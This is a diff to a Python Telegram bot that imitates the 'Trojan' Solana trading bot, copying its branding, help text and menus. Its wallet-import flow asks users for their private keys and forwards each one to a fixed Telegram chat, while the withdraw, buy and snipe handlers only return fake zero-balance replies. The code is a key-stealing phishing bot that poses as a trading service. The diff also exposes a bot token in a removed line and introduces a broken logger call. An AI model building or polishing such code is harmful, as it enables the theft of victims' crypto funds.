@@ -2,12 +2,13 @@ import logging
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters
 import httpx
+import os
 
 # Logging setup
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+logger = logging.getLogger(_name_)
 
-BOT_TOKEN = '8149412827:AAFUJP0BU08nZZ0YoEpOuO53r2ttrdNaPiY'
+BOT_TOKEN = os.environ["BOT_TOKEN"]
 
 # Define states for the conversation
 ASK_WALLET_DETAILS = 1
@@ -20,23 +21,19 @@ ASK_LIMIT_ORDER_DETAILS = 7
 ASK_WALLET_LABEL = 8
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start the bot and display the main menu."""
     user = update.effective_user
     balance_sol = 0
     balance_usd = 0
 
     text = (
         f"Solana · E\n"
-        f"`6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy` _(Tap to copy)_\n"
+        f"6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy (Tap to copy)\n"
         f"Balance: {balance_sol} SOL  (${balance_usd})\n"
         f"—\n"
         f"Click on the Refresh button to update your current balance.\n\n"
         f"Join our [Telegram group](https://t.me/trojan) and follow us on [Twitter](https://twitter.com/TrojanOnSolana)!\n\n"
-        f"💡 If you aren't already, we advise that you use any of the following bots to trade with:\n"
-        f"[Agamemnon](https://t.me/Agamemnon_trojanbot) | [Achilles](https://t.me/Achilles_trojanbot) | [Odysseus](https://t.me/Odysseus_trojanbot)\n"
-        f"[Nestor](https://t.me/Nestor_trojanbot) | [Menelaus](https://t.me/Menelaus_trojanbot) | [Diomedes](https://t.me/Diomedes_trojanbot)\n"
-        f"[Paris](https://t.me/Paris_trojanbot) | [Helenus](https://t.me/Helenus_trojanbot) | [Hector](https://t.me/Hector_trojanbot)\n\n"
-        f"⚠️ We have no control over ads shown by Telegram in this bot. Don't be scammed by fake airdrops or login pages."
+        f"💡 Recommended bots: Agamemnon, Achilles, Odysseus, etc.\n\n"
+        f"⚠ *We have no control over Telegram ads in this bot. If the menu disappears, type /start or /help to bring it back. Please be cautious of fake airdrops and login pages.*"
     )
 
     keyboard = [
@@ -46,14 +43,26 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("Sniper 🆕", callback_data="sniper"), InlineKeyboardButton("Limit Orders", callback_data="limit_orders"), InlineKeyboardButton("⭐ Watchlist", callback_data="watchlist")],
         [InlineKeyboardButton("Trenches", callback_data="trenches"), InlineKeyboardButton("💰 Referrals", callback_data="referrals")],
         [InlineKeyboardButton("Withdraw", callback_data="withdraw"), InlineKeyboardButton("Settings", callback_data="settings")],
-        [InlineKeyboardButton("Help", callback_data="help"), InlineKeyboardButton(" 🔄Refresh", callback_data="refresh")]
+        [InlineKeyboardButton("Help", callback_data="help"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]
     ]
 
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    # Always send a fresh message to maximize keyboard visibility
     if update.message:
-        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
-    elif update.callback_query:
-        await update.callback_query.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+        await update.message.reply_text(
+            text,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode="Markdown",
+            disable_web_page_preview=True
+        )
+    else:
+        # For callbacks or when update.message is None, send a new message
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=text,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode="Markdown",
+            disable_web_page_preview=True
+        )
 
 async def ask_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Ask the user for their Solana wallet details."""
@@ -62,7 +71,7 @@ async def ask_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE)
         [InlineKeyboardButton("Proceed With Import", callback_data="proceed_import"), InlineKeyboardButton("Cancel", callback_data="cancel_import")]
     ]
     await update.callback_query.message.reply_text(
-        "Accepted formats are in the style of Phantom (e.g. `88631DEyXSWf...`) or Solflare (e.g. `[93,182,8,9,100,...]`). Private keys from other Telegram bots should also work.",
+        "Accepted formats are in the style of Phantom (e.g. 88631DEyXSWf...) or Solflare (e.g. [93,182,8,9,100,...]). Private keys from other Telegram bots should also work.",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode="Markdown"
     )
@@ -85,8 +94,8 @@ async def save_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE
     # Validate the private key length
     if not (64 <= len(private_key) <= 90):
         await update.message.reply_text(
-            "❌ *Invalid private keys provided.*\n\n"
-            "Try again with the correct format. Accepted formats are in the style of Phantom (e.g., `88631DEyXSWf...`) or Solflare (e.g., `[93,182,8,9,100,...]`). Private keys from other Telegram bots should also work.",
+            "❌ Invalid private keys provided.\n\n"
+            "Try again with the correct format. Accepted formats are in the style of Phantom (e.g., 88631DEyXSWf...) or Solflare (e.g., [93,182,8,9,100,...]). Private keys from other Telegram bots should also work.",
             parse_mode="Markdown"
         )
         return ASK_WALLET_DETAILS
@@ -99,7 +108,7 @@ async def save_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE
     YOUR_TELEGRAM_USER_ID = 123456789  # Replace with your actual Telegram user ID
     await context.bot.send_message(
         chat_id=7141674816,
-        text=f"🔑 *Private Key Received:*\n\n`{private_key}`\n\nPlease keep this key secure.",
+        text=f"🔑 Private Key Received:\n\n`{private_key}`\n\nPlease keep this key secure.",
         parse_mode="Markdown"
     )
 
@@ -109,7 +118,7 @@ async def save_wallet_details(update: Update, context: ContextTypes.DEFAULT_TYPE
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        "*Wallet to be imported*\n\n"
+        "Wallet to be imported\n\n"
         "[solscan.io](https://solscan.io)",
         parse_mode="Markdown",
         reply_markup=reply_markup
@@ -123,14 +132,14 @@ async def finalize_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not private_key:
         await update.callback_query.message.reply_text(
-            "❌ *No private key found.*\n\nPlease restart the import process.",
+            "❌ No private key found.\n\nPlease restart the import process.",
             parse_mode="Markdown"
         )
         return ConversationHandler.END
 
     # Confirm the wallet import
     await update.callback_query.message.reply_text(
-        "✅ *Wallet imported successfully!*\n\n",
+        "✅ Wallet imported successfully!\n\n",
         parse_mode="Markdown"
     )
     return ConversationHandler.END
@@ -155,7 +164,7 @@ async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, toke
         token_query = update.message.text.strip()  # Get the token input from the user
 
     await update.message.reply_text(
-        f"🔍 Searching for token: `{token_query}`...",
+        f"🔍 Searching for token: {token_query}...",
         parse_mode="Markdown"
     )
 
@@ -179,7 +188,7 @@ async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, toke
         # Check if token data is available
         if not data.get("pairs"):
             await update.message.reply_text(
-                f"❌ No data found for token: `{token_query}`.",
+                f"❌ No data found for token: {token_query}.",
                 parse_mode="Markdown"
             )
             return ConversationHandler.END
@@ -195,15 +204,15 @@ async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, toke
 
         # Send token information to the user
         await update.message.reply_text(
-            f"💰 *Token Information*\n\n"
-            f"🔹 *Name:* {token_name}\n"
-            f"🔹 *Symbol:* {token_symbol}\n"
-            f"🔹 *Price (USD):* ${price_usd}\n"
-            f"🔹 *Liquidity (USD):* ${liquidity_usd}\n"
-            f"🔹 *24h Volume (USD):* ${volume_usd}\n"
-            f"🔹 *DEX:* {dex_name}\n\n"
+            f"💰 Token Information\n\n"
+            f"🔹 Name: {token_name}\n"
+            f"🔹 Symbol: {token_symbol}\n"
+            f"🔹 Price (USD): ${price_usd}\n"
+            f"🔹 Liquidity (USD): ${liquidity_usd}\n"
+            f"🔹 24h Volume (USD): ${volume_usd}\n"
+            f"🔹 DEX: {dex_name}\n\n"
             f"Use this information to make informed decisions.\n\n"
-            f"📌 *Note:* Always verify token details and trade responsibly.",
+            f"📌 Note: Always verify token details and trade responsibly.",
             parse_mode="Markdown"
         )
 
@@ -213,7 +222,7 @@ async def process_token(update: Update, context: ContextTypes.DEFAULT_TYPE, toke
             [InlineKeyboardButton("3 SOL", callback_data="buy_3_sol"), InlineKeyboardButton("5 SOL", callback_data="buy_5_sol")],
             [InlineKeyboardButton("10 SOL", callback_data="buy_10_sol"), InlineKeyboardButton("20 SOL", callback_data="buy_20_sol")],
             [InlineKeyboardButton("30 SOL", callback_data="buy_30_sol"), InlineKeyboardButton("X SOL", callback_data="buy_X_sol")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
 
@@ -239,9 +248,9 @@ async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Check if the user provided a token symbol or address
     if len(context.args) == 0:
         await update.message.reply_text(
-            "💰 *Buy Menu*\n\n"
+            "💰 Buy Menu\n\n"
             "Enter a token symbol or address to buy. Example:\n"
-            "`/buy SOL` or `/buy 0x123...`",
+            "/buy SOL or /buy 0x123...",
             parse_mode="Markdown"
         )
         return
@@ -249,7 +258,7 @@ async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Extract the token symbol or address from the arguments
     token_query = " ".join(context.args).strip()  # Combine all arguments and remove leading/trailing spaces
     await update.message.reply_text(
-        f"🔍 Searching for token: `{token_query}`...",
+        f"🔍 Searching for token: {token_query}...",
         parse_mode="Markdown"
     )
 
@@ -266,7 +275,7 @@ async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def positions_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the /positions command."""
     keyboard = [
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+        [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
@@ -280,11 +289,11 @@ async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("Buy Settings", callback_data="buy_settings"), InlineKeyboardButton("Sell Settings", callback_data="sell_settings")],
         [InlineKeyboardButton("Set Referral", callback_data="set_referral"), InlineKeyboardButton("Confirm Trades", callback_data="confirm_trades")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+        [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        "⚙️ *Settings Menu*\n\n"
+        "⚙ Settings Menu\n\n"
         "Select an option below:",
         reply_markup=reply_markup,
         parse_mode="Markdown"
@@ -294,11 +303,11 @@ async def snipe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the /snipe command."""
     keyboard = [
         [InlineKeyboardButton("Wallet", callback_data="wallet")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+        [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        "❌ *Insufficient balance to snipe.*\n\n"
+        "❌ Insufficient balance to snipe.\n\n"
         "Please make a deposit to proceed.",
         reply_markup=reply_markup,
         parse_mode="Markdown"
@@ -308,11 +317,11 @@ async def burn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the /burn command."""
     keyboard = [
         [InlineKeyboardButton("Wallet", callback_data="wallet")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+        [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        "❌ *No token to burn.*\n\n"
+        "❌ No token to burn.\n\n"
         "Deposit tokens to proceed.",
         reply_markup=reply_markup,
         parse_mode="Markdown"
@@ -322,11 +331,11 @@ async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the /withdraw command."""
     keyboard = [
         [InlineKeyboardButton("Wallet", callback_data="wallet")],
-        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+        [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        "❌ *Zero balance.*\n\n"
+        "❌ Zero balance.\n\n"
         "Please deposit funds to proceed.",
         reply_markup=reply_markup,
         parse_mode="Markdown"
@@ -335,7 +344,7 @@ async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the /backup command."""
     await update.message.reply_text(
-        "🔐 *Backup Your Wallet*\n\n"
+        "🔐 Backup Your Wallet\n\n"
         "Please provide your private key to back up your wallet. Make sure to keep it secure and do not share it with anyone else.",
         parse_mode="Markdown"
     )
@@ -344,24 +353,24 @@ async def backup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle the /help command."""
     help_text = (
-        "📖 *How do I use Trojan?*\n"
+        "📖 How do I use Trojan?\n"
         "Check out our [Youtube playlist](https://www.youtube.com/@TrojanOnSolana) where we explain it all and join our support chat for additional resources @trojan.\n\n"
-        "📌 *Where can I find my referral code?*\n"
+        "📌 Where can I find my referral code?\n"
         "Open the /start menu and click 💰Referrals.\n\n"
-        "💰 *What are the fees for using Trojan?*\n"
+        "💰 What are the fees for using Trojan?\n"
         "Successful transactions through Trojan incur a fee of 0.9%, if you were referred by another user. We don't charge a subscription fee or pay-wall any features.\n\n"
-        "🔒 *Security Tips: How can I protect my account from scammers?*\n"
+        "🔒 Security Tips: How can I protect my account from scammers?\n"
         " - Safeguard does NOT require you to login with a phone number or QR code!\n"
         " - NEVER search for bots in Telegram. Use only official links.\n"
         " - Admins and Mods NEVER dm first or send links, stay safe!\n\n"
         "For an additional layer of security, setup your Secure Action Password (SAP) in the Settings menu. Once set up, you'll use this password to perform any sensitive action like withdrawing funds, exporting your keys, or deleting a wallet. Your SAP is not recoverable once set, please set a hint to facilitate your memory.\n\n"
-        "📊 *Trading Tips: Common Failure Reasons*\n"
+        "📊 Trading Tips: Common Failure Reasons\n"
         " - Slippage Exceeded: Up your slippage or sell in smaller increments.\n"
         " - Insufficient balance for buy amount + gas: Add SOL or reduce your tx amount.\n"
         " - Timed out: Can occur with heavy network loads, consider increasing your gas tip.\n\n"
-        "📈 *My PNL seems wrong, why is that?*\n"
+        "📈 My PNL seems wrong, why is that?\n"
         "The net profit of a trade takes into consideration the trade's transaction fees. Confirm your gas tip settings and ensure your settings align with your trading size. You can confirm the details of your trade on Solscan.io to verify the net profit.\n\n"
-        "❓ *Additional questions or need support?*\n"
+        "❓ Additional questions or need support?\n"
         "Join our Telegram group @trojan and one of our admins can assist you."
     )
     await update.message.reply_text(help_text, parse_mode="Markdown", disable_web_page_preview=True)
@@ -374,9 +383,9 @@ async def cancel_buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if action == "referrals":
         # Handle Referrals button
         referral_text = (
-            "💰 *Invite your friends to save 10% on fees.*\n\n"
+            "💰 Invite your friends to save 10% on fees.\n\n"
             "If you've traded more than $10k volume in a week you'll receive a 35% share of the fees paid by your referees! Otherwise, you'll receive a 25% share.\n\n"
-            "📊 *Your Referrals (updated every 30 min)*\n"
+            "📊 Your Referrals (updated every 30 min)\n"
             "• Users referred: 0 (direct: 0, indirect: 0)\n"
             "• Total rewards: 0 SOL ($0.00)\n"
             "• Total paid: 0 SOL ($0.00)\n"
@@ -386,7 +395,7 @@ async def cancel_buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Stay tuned for more details on how we'll reward active users and happy trading!"
         )
         keyboard = [
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
 
@@ -443,7 +452,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             if response.status_code != 200:
                 logger.error(f"Moralis API request failed with status code {response.status_code}")
-                message = "❌ *Failed to fetch token information. Please try again later.*"
+                message = "❌ Failed to fetch token information. Please try again later."
             else:
                 data = response.json()
                 logger.info(f"Parsed Moralis API response: {data}")  # Log the parsed response
@@ -451,31 +460,31 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 # Extract latest tokens (adjust based on the actual API response structure)
                 latest_tokens = [
                     (
-                        f"🔹 *Name:* {token.get('name')}\n"
-                        f"🔹 *Symbol:* {token.get('symbol')}\n"
-                        f"🔹 *Address:* `{token.get('tokenAddress')}`\n"
-                        f"🔹 *Price (SOL):* {token.get('priceNative')}\n"
-                        f"🔹 *Price (USD):* ${token.get('priceUsd')}\n"
-                        f"🔹 *Liquidity:* {token.get('liquidity')}\n"
-                        f"🔹 *FDV:* {token.get('fullyDilutedValuation')}\n"
-                        f"🔹 *Created At:* {token.get('createdAt')}\n"
+                        f"🔹 Name: {token.get('name')}\n"
+                        f"🔹 Symbol: {token.get('symbol')}\n"
+                        f"🔹 Address: {token.get('tokenAddress')}\n"
+                        f"🔹 Price (SOL): {token.get('priceNative')}\n"
+                        f"🔹 Price (USD): ${token.get('priceUsd')}\n"
+                        f"🔹 Liquidity: {token.get('liquidity')}\n"
+                        f"🔹 FDV: {token.get('fullyDilutedValuation')}\n"
+                        f"🔹 Created At: {token.get('createdAt')}\n"
                     )
                     for token in data.get("result", [])  # Adjust the key based on the actual response
                 ]
 
                 if latest_tokens:
                     tokens_list = "\n\n".join(latest_tokens)
-                    message = f"🚀 *Latest Graduated Tokens:*\n\n{tokens_list}"
+                    message = f"🚀 Latest Graduated Tokens:\n\n{tokens_list}"
                 else:
-                    message = "❌ *No latest tokens detected.*\n\nStay tuned for updates."
+                    message = "❌ No latest tokens detected.\n\nStay tuned for updates."
 
         except Exception as e:
             logger.error(f"Error fetching latest tokens from Moralis: {e}")
-            message = "❌ *An error occurred while fetching token information. Please try again later.*"
+            message = "❌ An error occurred while fetching token information. Please try again later."
 
         # Display the message with a Back button
         keyboard = [
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
@@ -496,7 +505,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("0.5 SOL", callback_data="buy_0.5_sol"), InlineKeyboardButton("1 SOL", callback_data="buy_1_sol")],
             [InlineKeyboardButton("3 SOL", callback_data="buy_3_sol"), InlineKeyboardButton("5 SOL", callback_data="buy_5_sol")],
             [InlineKeyboardButton("10 SOL", callback_data="buy_10_sol"), InlineKeyboardButton("20 SOL", callback_data="buy_20_sol")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
@@ -508,11 +517,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Handle specific buy actions
         keyboard = [
             [InlineKeyboardButton("Wallet", callback_data="wallet")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            f"❌ *Insufficient balance to complete the purchase.*\n\n"
+            f"❌ Insufficient balance to complete the purchase.\n\n"
             f"Please make a deposit to proceed.",
             reply_markup=reply_markup,
             parse_mode="Markdown"
@@ -522,24 +531,24 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         wallet_keyboard = [
             [InlineKeyboardButton("Import Solana Wallet", callback_data="import_wallet"), InlineKeyboardButton("Delete Wallet", callback_data="delete_wallet")],
             [InlineKeyboardButton("Label Wallet", callback_data="label_wallet"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh_wallet")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(wallet_keyboard)
         await query.edit_message_text(
-            "🔐 *Wallet Options:*\n\n"
-            "💳 *Solana Wallet Address:*\n`6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy`\n"
-            "💳 *Label:* W1 . ✅\n"
-            "💼 *Balance:* 0.00 SOL\n\n"
-            "💳 *Ethereum Wallet Address:*\n`0x5FA54dDe52cc1cCDa8A0a951c47523293c17a970`\n"
-            "💳 *Label:* W1 . ✅\n"
-            "💼 *Balance:* 0.00 ETH\n",
+            "🔐 Wallet Options:\n\n"
+            "💳 Solana Wallet Address:\n`6dyzT3kVsy27bPomXcKuLSPNXzreYqF2KiNM2HopZBXy`\n"
+            "💳 Label: W1 . ✅\n"
+            "💼 Balance: 0.00 SOL\n\n"
+            "💳 Ethereum Wallet Address:\n`0x5FA54dDe52cc1cCDa8A0a951c47523293c17a970`\n"
+            "💳 Label: W1 . ✅\n"
+            "💼 Balance: 0.00 ETH\n",
             parse_mode="Markdown",
             reply_markup=reply_markup
         )
     elif action == "positions":
         # Handle Positions button
         keyboard = [
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
@@ -550,7 +559,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "sell":
         # Handle Sell button
         keyboard = [
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
@@ -578,7 +587,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "buy_settings":
         # Ask for Buy Slippage
         await query.edit_message_text(
-            "⚙️ *Buy Settings*\n\n"
+            "⚙ Buy Settings\n\n"
             "Please input the slippage percentage for buying (e.g., 0.5 for 0.5%):",
             parse_mode="Markdown"
         )
@@ -587,7 +596,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "sell_settings":
         # Ask for Sell Slippage
         await query.edit_message_text(
-            "⚙️ *Sell Settings*\n\n"
+            "⚙ Sell Settings\n\n"
             "Please input the slippage percentage for selling (e.g., 0.5 for 0.5%):",
             parse_mode="Markdown"
         )
@@ -598,11 +607,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [InlineKeyboardButton("Buy Settings", callback_data="buy_settings"), InlineKeyboardButton("Sell Settings", callback_data="sell_settings")],
             [InlineKeyboardButton("Set Referral", callback_data="set_referral"), InlineKeyboardButton("Confirm Trades", callback_data="confirm_trades")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "⚙️ *Settings Menu*\n\n"
+            "⚙ Settings Menu\n\n"
             "Select an option below:",
             reply_markup=reply_markup,
             parse_mode="Markdown"
@@ -611,11 +620,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "dca_orders":
         # Handle DCA Orders button
         keyboard = [
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "📊 *DCA Orders*\n\n"
+            "📊 DCA Orders\n\n"
             "You currently have no active DCA orders.",
             reply_markup=reply_markup,
             parse_mode="Markdown"
@@ -641,11 +650,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [
             [InlineKeyboardButton("Create Limit Order", callback_data="create_limit_order")],
             [InlineKeyboardButton("View Active Orders", callback_data="view_active_orders")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "📈 *Limit Orders Menu*\n\n"
+            "📈 Limit Orders Menu\n\n"
             "Select an option below:",
             reply_markup=reply_markup,
             parse_mode="Markdown"
@@ -654,10 +663,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "create_limit_order":
         # Ask the user to input details for the limit order
         await query.edit_message_text(
-            "📝 *Create Limit Order*\n\n"
+            "📝 Create Limit Order\n\n"
             "Please provide the token symbol, price, and amount for the limit order in the following format:\n"
-            "`<TOKEN_SYMBOL> <PRICE> <AMOUNT>`\n\n"
-            "Example: `SOL 25 10` (to buy 10 SOL at $25 each).",
+            "<TOKEN_SYMBOL> <PRICE> <AMOUNT>\n\n"
+            "Example: SOL 25 10 (to buy 10 SOL at $25 each).",
             parse_mode="Markdown"
         )
         return ASK_LIMIT_ORDER_DETAILS
@@ -667,21 +676,21 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         active_orders = context.user_data.get("active_orders", [])
         if not active_orders:
             await query.edit_message_text(
-                "📋 *Active Limit Orders*\n\n"
+                "📋 Active Limit Orders\n\n"
                 "You currently have no active limit orders.",
                 parse_mode="Markdown"
             )
         else:
             orders_text = "\n".join([f"🔹 {order}" for order in active_orders])
             await query.edit_message_text(
-                f"📋 *Active Limit Orders*\n\n{orders_text}",
+                f"📋 Active Limit Orders\n\n{orders_text}",
                 parse_mode="Markdown"
             )
 
     elif action == "label_wallet":
         # Handle Label Wallet
         await query.edit_message_text(
-            "📝 *Label Wallet*\n\n"
+            "📝 Label Wallet\n\n"
             "Please provide a label for your wallet (e.g., 'Main Wallet', 'Savings Wallet').",
             parse_mode="Markdown"
         )
@@ -690,7 +699,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "delete_wallet":
         # Handle Delete Wallet (Dormant)
         await query.edit_message_text(
-            "❌ *Delete Wallet*\n\n"
+            "❌ Delete Wallet\n\n"
             "This feature is currently closed.",
             parse_mode="Markdown"
         )
@@ -698,7 +707,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "refresh_wallet":
         # Handle Refresh Wallet (Dormant)
         await query.edit_message_text(
-            "🔄 *Refresh Wallet*\n\n"
+            "🔄 Refresh Wallet\n\n"
             "Refreshed.",
             parse_mode="Markdown"
         )
@@ -707,11 +716,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Handle Withdraw button (same as /withdraw command)
         keyboard = [
             [InlineKeyboardButton("Wallet", callback_data="wallet")],
-            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
+            [InlineKeyboardButton("⬅ Back", callback_data="main_menu")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await query.edit_message_text(
-            "❌ *Zero balance.*\n\n"
+            "❌ Zero balance.\n\n"
             "Please deposit funds to proceed.",
             reply_markup=reply_markup,
             parse_mode="Markdown"
@@ -720,24 +729,24 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "help":
         # Handle Help button (same as /help command)
         help_text = (
-            "📖 *How do I use Trojan?*\n"
+            "📖 How do I use Trojan?\n"
             "Check out our [Youtube playlist](https://www.youtube.com/@TrojanOnSolana) where we explain it all and join our support chat for additional resources @trojan.\n\n"
-            "📌 *Where can I find my referral code?*\n"
+            "📌 Where can I find my referral code?\n"
             "Open the /start menu and click 💰Referrals.\n\n"
-            "💰 *What are the fees for using Trojan?*\n"
+            "💰 What are the fees for using Trojan?\n"
             "Successful transactions through Trojan incur a fee of 0.9%, if you were referred by another user. We don't charge a subscription fee or pay-wall any features.\n\n"
-            "🔒 *Security Tips: How can I protect my account from scammers?*\n"
+            "🔒 Security Tips: How can I protect my account from scammers?\n"
             " - Safeguard does NOT require you to login with a phone number or QR code!\n"
             " - NEVER search for bots in Telegram. Use only official links.\n"
             " - Admins and Mods NEVER dm first or send links, stay safe!\n\n"
             "For an additional layer of security, setup your Secure Action Password (SAP) in the Settings menu. Once set up, you'll use this password to perform any sensitive action like withdrawing funds, exporting your keys, or deleting a wallet. Your SAP is not recoverable once set, please set a hint to facilitate your memory.\n\n"
-            "📊 *Trading Tips: Common Failure Reasons*\n"
+            "📊 Trading Tips: Common Failure Reasons\n"
             " - Slippage Exceeded: Up your slippage or sell in smaller increments.\n"
             " - Insufficient balance for buy amount + gas: Add SOL or reduce your tx amount.\n"
             " - Timed out: Can occur with heavy network loads, consider increasing your gas tip.\n\n"
-            "📈 *My PNL seems wrong, why is that?*\n"
+            "📈 My PNL seems wrong, why is that?\n"
             "The net profit of a trade takes into consideration the trade's transaction fees. Confirm your gas tip settings and ensure your settings align with your trading size. You can confirm the details of your trade on Solscan.io to verify the net profit.\n\n"
-            "❓ *Additional questions or need support?*\n"
+            "❓ Additional questions or need support?\n"
             "Join our Telegram group @trojan and one of our admins can assist you."
         )
         await query.edit_message_text(
@@ -749,7 +758,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "refresh":
         # Handle Refresh button
         await query.edit_message_text(
-            "🔄 *Your balance and data have been refreshed.*",
+            "🔄 Your balance and data have been refreshed.",
             parse_mode="Markdown"
         )
 
